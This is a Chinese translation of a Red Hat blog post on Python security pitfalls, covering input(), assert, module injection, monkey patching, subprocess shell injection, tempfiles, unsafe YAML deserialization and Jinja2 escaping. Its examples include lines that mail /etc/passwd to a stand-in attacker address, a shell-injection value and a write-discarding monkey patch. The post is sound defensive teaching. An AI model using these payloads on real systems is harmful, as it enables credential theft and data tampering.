原文：[A bite of Python](https://access.redhat.com/blogs/766093/posts/2592591)

---

由于易于学习以及快速开发更大更复杂的应用，Python渐渐在计算环境中无处不在。尽管明显的语言清晰度和友好会麻痹软件工程师和系统管理员的警觉性 —— 诱使他们编码可能会有严重安全隐患的错误。在这篇文章中，它主要针对Python新手，会看到少量安全相关的小技巧；有经验的开发者可能会注意到后面的特殊性。

## 输入函数

在Python 2 大量的内置功能集合中，[input](https://docs.python.org/2/library/functions.html#input)完全就是一个安全灾难。一旦调用它，从标准输入读入的任何东西都会被立即解析为Python代码：

```python

       $ python2
        >>> input()
        dir()
        ['__builtins__', '__doc__', '__name__', '__package__']
       >>> input()
       __import__('sys').exit()
       $
    
```

显然，必须永远不使用`input`函数，除非脚本的标准输入中的数据是完全可信的。Python 2文档建议将`raw_input`作为一个安全的替代品。在Python 3中，`input`函数等同于`raw_input`，从而一劳永逸地解决了这个隐患。

## 断言语句

在Python应用中使用`assert`语句在不可能条件下捕获是一个编程习惯。

```python

       def verify_credentials(username, password):
           assert username and password, 'Credentials not supplied by caller'
    
           ... authenticate possibly null user with null password ...
    
```

然而，在将源代码编译成优化的字节码时（例如，python -O），Python并不为`assert`语句生成任何指令。它默默地删除那些程序员写的让程序免受畸形数据攻击的代码，让应用暴露在攻击之中。

该漏洞的根本原因在于[`assert`机制](https://docs.python.org/3/reference/simple_stmts.html#the-assert-statement)纯粹是为测试目的而设，正如在C++中做的那样。程序员必须使用其他手段以保证数据一致性。

## 可重复使用的整数

Python中万物皆对象。每个对象都有一个唯一标识，可以用[id函数](https://docs.python.org/2/library/functions.html#id)来读取。要找出两个变量或两个属性是否都指向同一个对象，可以使用`is`操作符。整数是对象，因此`is`操作符确实是为它们定义的：

```python

        >>> 999+1 is 1000
        False
    
```

如果上面操作的结果看起来令人讶异，那么记住，`is`操作符是在两个对象的标识上工作的 —— 它并不比较他们的数值，或者其他值。然而：

```python

        >>> 1+1 is 2
        True
    
```

对该行为的解释是，Python维护了一个对象连接池，其中保有前几百个整数，重用它们会节约内存和对象的创建。更让人凌乱的是，“小整数”的定义在不同的Python版本中不同。

这里的处理措施是，绝对不要把`is`操作符用于值的比较上。`is`操作符是设计于唯一处理对象标识。

## 浮点数比较

由于固有受限精度，以及十进制与二进制小数表示所产生的差异，使用浮点数可能很复杂。混乱的一个常见原因是，浮点比较有时可能会产生意想不到的结果。下面是一个著名的例子：

```python

       >>> 2.2 * 3.0 == 3.3 * 2.0
       False
    
```

上面的现象的原因实际上是舍入错误：

```python

       >>> (2.2 * 3.0).hex()
       '0x1.a666666666667p+2'
       >>> (3.3 * 2.0).hex()
       '0x1.a666666666666p+2'
    
```

另一个有趣的现象是有关Python `float`类型支持无穷大的概念。人们有理由相信，一切都比无穷小：

```python

       >>> 10**1000000 > float('infinity')
       False
    
```

然而，到了Python 3，一个type对象打败了无穷：

```python

       >>> float > float('infinity')
       True
    
```

最好的处理措施是只要有可能，就坚持整数运算。次好的处理措施可能是使用[decimal](https://docs.python.org/3/library/decimal.html) stdlib模块，它试图保护用户免受琐碎细节和危险缺陷之苦。

一般来说，当重要的决定是基于算术运算的结果做出的，就必须小心不要成为舍入错误的牺牲品。见Python文档中的[发行和限制](https://docs.python.org/3/tutorial/floatingpoint.html)章节。

## 私有属性

Python不支持对象属性隐藏。但基于[双下划线属性重整(attribute mangling)](https://docs.python.org/3/tutorial/classes.html#tut-private)的特性，有一个解决方法。虽然属性名的修改[只发生在代码上](https://docs.python.org/3/reference/expressions.html#atom-identifiers)，但是硬编码到字符串常量的属性名保持不变。当一个双下划线的属性明显从`getattr()`/`hasattr()`函数“隐藏”，这可能会导致混乱的行为。

```python

       >>> class X(object):
       ...   def __init__(self):
       ...     self.__private = 1
       ...   def get_private(self):
       ...     return self.__private
       ...   def has_private(self):
       ...     return hasattr(self, '__private')
       ... 
       >>> x = X()
       >>>
       >>> x.has_private()
       False
       >>> x.get_private()
       1
    
```

要让这个私有特性能用，类定义之外的属性并不执行属性重整（attribute mangling）。基于被引用地方，它有效地将任意给定的双下划线属性“分裂”成两类：

```python

       >>> class X(object):
       ...   def __init__(self):
       ...     self.__private = 1
       >>>
       >>> x = X()
       >>>
       >>> x.__private
       Traceback
       ...
       AttributeError: 'X' object has no attribute '__private'
       >>>
       >>> x.__private = 2
       >>> x.__private
       2
       >>> hasattr(x, '__private')
       True
    
```

如果程序员依赖于双下划线属性来在他们的代码中做出重要决定，而不关注私有属性的不对称行为，那么这些小技巧会变成安全漏洞。

## 模块注入

Python的模块导入系统功能强大而复杂。模块和包可以通过定义在[sys.path](https://docs.python.org/3/library/sys.html#sys.path)列表中的搜索路径找到的文件或目录名导入。搜索路径初始化是一个复杂的过程，它也依赖于Python版本，平台和本地配置。要对一个Python应用程序进行成功攻击，攻击者需要找到一种方法来将恶意Python模块揉入进Python在尝试导入模块时会考虑的一个目录或可导入包文件。

处理措施是维护搜索路径中的所有目录和包文件的安全访问权限，以确保未经授权的用户无法对其进行写访问。请记住，调用Python解释器的初始脚本所在的目录会自动插入到搜索路径中。

像这样运行脚本显示实际的搜索路径：

```python

       $ cat myapp.py
       #!/usr/bin/python
    
       import sys
       import pprint
    
       pprint.pprint(sys.path)
    
```

在Windows平台，Python进程的当前工作目录，而不是脚本所在位置，会被[注入](https://docs.python.org/3/using/windows.html#finding-modules)到搜索路径中。在UNIX平台，无论何时从标准输入或者命令行("-"或者"-c"或者"-m"选项)读入程序代码，当前工作目录都会自动插入到`sys.path`中：

```python

       $ echo "import sys, pprint; pprint.pprint(sys.path)" | python -
       ['',
        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
        ...]
       $ python -c 'import sys, pprint; pprint.pprint(sys.path)'
       ['',
        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
        ...]
       $
       $ cd /tmp
       $ python -m myapp
       ['',
        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
        ...]
    
```

要处理从当前工作路径注入模块的风险，推荐在Windows运行Python或者通过命令行传递代码之前，显式地修改目录到一个安全的目录。

另一个搜索路径可能的来源是`$PYTHONPATH`环境变量的内容。抵御`sys.path`不被进程环境污染的简单方法是传递`-E`选项给Python解释器，这会让它忽略`$PYTHONPATH`变量。

## 导入时的代码执行

语句实际上会导致导入的模块中的代码的执行，这一事实并不明显。这就是为什么甚至导入不可信模块或包是有风险的。导入像这样的简单模块可能会导致不愉快的结果：

```python

       $ cat malicious.py
       import os
       import sys
    
       os.system('cat /etc/passwd | mail attacker@blackhat.com')
    
       del sys.modules['malicious']  # pretend it's not imported
       $ python
       >>> import malicious
       >>> dir(malicious)
       Traceback (most recent call last):
       NameError: name 'malicious' is not defined
    
```

与`sys.path`入口注入攻击相结合，它可能为进一步的系统漏洞利用铺平道路。

## 猴子补丁(monkey patching)

运行时修改Python对象属性的过程称之为猴子补丁(monkey patching)。作为动态语言，Python完全支持运行时程序自省和代码突变。一旦以某种方式导入了一个恶意模块，那么任何现有的可变对象可被不知不觉地在没有程序员同意的情况下被打猴子补丁。考虑以下情况：

```python

       $ cat nowrite.py
       import builtins
    
       def malicious_open(*args, **kwargs):
          if len(args) > 1 and args[1] == 'w':
             args = ('/dev/null',) + args[1:]
          return original_open(*args, **kwargs)
    
       original_open, builtins.open = builtins.open, malicious_open
    
```

如果Python解释器执行了上面的代码，那么任何写到文件的东西都不会存储在文件系统中：

```python

       >>> import nowrite
       >>> open('data.txt', 'w').write('data to store')
       5
       >>> open('data.txt', 'r')
       Traceback (most recent call last):
       ...
       FileNotFoundError: [Errno 2] No such file or directory: 'data.txt'
    
```

攻击者可以利用Python垃圾回收器(`gc.get_objects()`)来掌握现有的所有对象，并黑进它们中任意一个。

在Python 2中，内置的对象可以通过魔法`__builtins__`模块访问。一个已知的技巧，利用`__builtins__`可变性，可以让整个世界崩溃：

```python

       >>> __builtins__.False, __builtins__.True = True, False
       >>> True
       False
       >>> int(True)
       0
    
```

在Python 3中，对`True`和`False`的赋值不起作用，因此不能那样操作。

在Python中，函数时第一类对象，它们维护了到函数的许多属性的引用。特别是，可执行字节码被`__code__`属性引用，当然，这是可以被修改的：

```python

       >>> import shutil
       >>>
       >>> shutil.copy
       <function copy at 0x7f30c0c66560>
       >>> shutil.copy.__code__ = (lambda src, dst: dst).__code__
       >>>
       >>> shutil.copy('my_file.txt', '/tmp')
       '/tmp'
       >>> shutil.copy
       <function copy at 0x7f30c0c66560>
       >>>
    
```

一旦应用了上面的猴子补丁，尽管`shutil.copy`函数看起来仍然理智，但由于误操作的lambda函数代码的设置，它默默地停止了工作。

Python对象的类型是由`__class__`属性决定的。邪恶的攻击者可以通过依靠改变活动对象的类型来令人绝望地把事情搞砸：

```python

       >>> class X(object): pass
       ... 
       >>> class Y(object): pass
       ... 
       >>> x_obj = X()
       >>> x_obj
       <__main__.X object at 0x7f62dbe5e010>
       >>> isinstance(x_obj, X)
       True
       >>> x_obj.__class__ = Y
       >>> x_obj
       <__main__.Y object at 0x7f62dbe5d350>
       >>> isinstance(x_obj, X)
       False
       >>> isinstance(x_obj, Y)
       True
       >>> 
    
```

对抗恶意猴子补丁的唯一处理措施是保证导入的Python模块的真实性和完整性。

## 通过subprocess进行shell注入

以胶水语言著称，对Python脚本来说，通过让操作系统来执行它们，可能还提供额外的参数，来委派系统管理任务给其他程序，是非常常见的。[subprocess](https://docs.python.org/3/library/subprocess.html)模块为这样的任务提供了易于使用和相当高层次的服务。

```python

       >>> from subprocess import call
       >>>
       >>> unvalidated_input = '/bin/true'
       >>> call(unvalidated_input)
       0
    
```

但有一个陷阱！要利用UNIX shell服务，例如命令行参数扩展，`call`函数的`shell`关键字参数应该设置为`True`。然后原样传递`call`函数的第一个参数给系统shell，用以进一步的解析。一旦无效的用户输入到达`call`函数 (或者其他在`subprocess`模块中实现的函数)，那么就会开放一个口给底层系统资源。

```python

       >>> from subprocess import call
       >>>
       >>> unvalidated_input = '/bin/true'
       >>> unvalidated_input += '; cut -d: -f1 /etc/passwd'
       >>> call(unvalidated_input, shell=True)
       root
       bin
       daemon
       adm
       lp
       0
    
```

显然，将`shell`关键字保持默认值`False`，并且提供命令及其参数的数组给`subprocess`函数，不要为外部命令执行调用UNIX shell，这样会安全得多。在这第二次调用格式，命令或者它的参数都不会被shell解析或展开。

```python

       >>> from subprocess import call
       >>>
       >>> call(['/bin/ls', '/tmp'])
    
```

如果应用的本质决定了使用UNIX shell服务，那么清理一切到`subprocess`的参数，确保没有不想要的shell功能可以被恶意用户利用，这完全是重要的。在更新的Python版本中，可以用标准库的[shlex.quote](https://docs.python.org/3/library/shlex.html#shlex.quote)函数来进行shell转义。

## 临时文件

由于基于临时文件的使用不当导致的漏洞在许多编程语言中皆有出现，而它们在Python中仍然惊人地常见，因此，在这里值得一提。

这类型的漏洞利用不安全的文件系统访问权限，可能涉及中间步骤，最终导致数据的机密性和完整性问题。一般问题的详细描述可以在[CWE-377](http://cwe.mitre.org/data/definitions/377.html)找到。

幸运的是，Python的标准库中自带了`tempfile`模块，它提供高层次函数，“以可能的最安全的方式”来创建临时文件名。注意，有缺陷的`tempfile.mktemp`实现，出于向后兼容的原因，它仍然存在于库中。必须永远不要使用`tempfile.mktemp`函数！取而代之，如果你需要在临时文件关闭后进行持久化，那么使用`tempfile.TemporaryFile`，或者`tempfile.mkstemp`。

另一种偶然引入漏洞的可能性是通过使用`shutil.copyfile`函数。这里的问题是，可能以最不安全的方式[创建](https://github.com/python/cpython/blob/master/Lib/shutil.py#L115)目标文件。

安全意识高的开发者可能会考虑首先将源文件复制到一个随机的临时文件名，然后将临时文件重命名为它最终的名字。虽然这可能看起来是一个好的方案，但是如果使用`shutil.move`函数来进行重命名，那么也是不安全的。麻烦的是，如果在文件系统，而不是最终文件所在的地方创建临时文件，那么`shutil.move`将无法自动地重命名(通过`os.rename`)，而是默默地求助于不安全的`shutil.copy`。一个处理措施是使用`os.rename`而不是`shutil.move`，因为`os.rename`保证跨文件系统边界的操作会有明确的失败。

进一步的并发症可能会在`shutil.copy`不能够拷贝所有的文件元数据的时候出现，可能使得创建的文件不受保护。

不完全是针对Python，当修改非主流类型的文件系统，特别是远程文件系统上的文件时必须小心。数据一致性保证倾向于在文件访问序列方面不同。作为一个例子，NFSv2并不遵守`open`系统调用的[O_EXCL](https://docs.python.org/3/library/os.html#os.O_EXCL)标志，而它是原子文件创建的关键。

## 不安全的反序列化

存在许多数据序列化计算，其中，[Pickle](https://docs.python.org/3/library/pickle.html)是专为反序列化/序列化Python对象而设计的。其目的在于将活动的Python对象转存储为用以存储或传输的字节流，然后将它们重新构造成(可能是)另一个Python实例。如果序列化数据被篡改，那么重新构造的过程则是潜在的风险。Pickle的不安全性是公认的，并且在Python文档中有明确指出。

作为一个流行的配置文件格式，YAML不一定被认为是一个能够诱使反序列化器执行任意代码的强大的序列化协议。让它甚至更危险的是，事实上Python的YAML默认实现 —— [PyYAML](http://pyyaml.org/wiki/PyYAMLDocumentation)让反序列化看起来非常无辜：

```python

       >>> import yaml
       >>>
       >>> dangerous_input = """
       ... some_option: !!python/object/apply:subprocess.call
       ...   args: [cat /etc/passwd | mail attacker@blackhat.com]
       ...   kwds: {shell: true}
       ... """
       >>> yaml.load(dangerous_input)
       {'some_option': 0}
    
```

...而/etc/passwd已经被窃取了。一个建议的解决方法是总是使用`yaml.safe_load`来处理那些你不信任的YAML序列化。尽管如此，目前的PyYAML默认感觉有些驱使人考虑其他倾向于为相似的目的使用`dump`/`load`函数名（但是以一种安全的方式）的序列化库。

## 模板引擎

Web应用作者很早之前就采用了Python。在十年的过程中，开发了相当多的Web框架。它们许多都利用了[模板引擎](https://wiki.python.org/moin/Templating)来从，嗯，模板和运行时变量生成动态web内容。除了web应用，模板引擎还渗入到完全不同的软件中，例如Ansible IT自动化工具。

当内容被静态模板和运行时变量渲染时，会有用户控制的代码通过运行时变量注入的风险。针对web应用的成功发起攻击可能导致[跨站脚本](https://en.wikipedia.org/wiki/Cross-site_scripting)漏洞。服务器端模板诸如的一般缓解方法是插值到最终文档之前清理模板变量的内容。清理可以通过拒绝、剥离或者转义那些特定于任何给定的标记或者其他特定领域的语言字符来完成。

不幸的是，这里，模板引擎似乎并没朝着更严格的安全靠近 —— 看看最流行的实现，它们都没有默认使用转义机制，而是依赖开发者对风险的意识。

例如，[Jinja2](http://jinja.pocoo.org/)，这一可能是最流行的工具之一，渲染一切：

```python

       >>> from jinja2 import Environment
       >>>
       >>> template = Environment().from_string('')
       >>> template.render(variable='<script>do_evil()</script>')
       '<script>do_evil()</script>'
    
```

...除非许多可能的转义机制之一是显式地反转其默认设置：

```python

       >>> from jinja2 import Environment
       >>>
       >>> template = Environment(autoescape=True).from_string('')
       >>> template.render(variable='<script>do_evil()</script>')
       '&lt;script&gt;do_evil()&lt;/script&gt;'
    
```

另外一个复杂之处在于，在某些使用情况下，程序员不想清除所有的模板变量，故意留下一些来保持潜在危险的内容不变。模板引擎通过引入“过滤器”来让程序员明确清理各个变量的内容，以满足这种需要。Jinja2还提供触发每个模板基础中默认转义的可能性。

如果开发者选择只转义标记语言标签的子集，让其他合法地溜进最后的文档中，那么它会变得更加脆弱和复杂。

## 总结

本文并不是要具体列出Python生态中所有潜在的陷阱和缺点。我们的目标是提高对那些一旦开始用Python写代码就有可能出现的安全风险的警觉性，希望让编程更加愉快，让我们的生活更加安全。

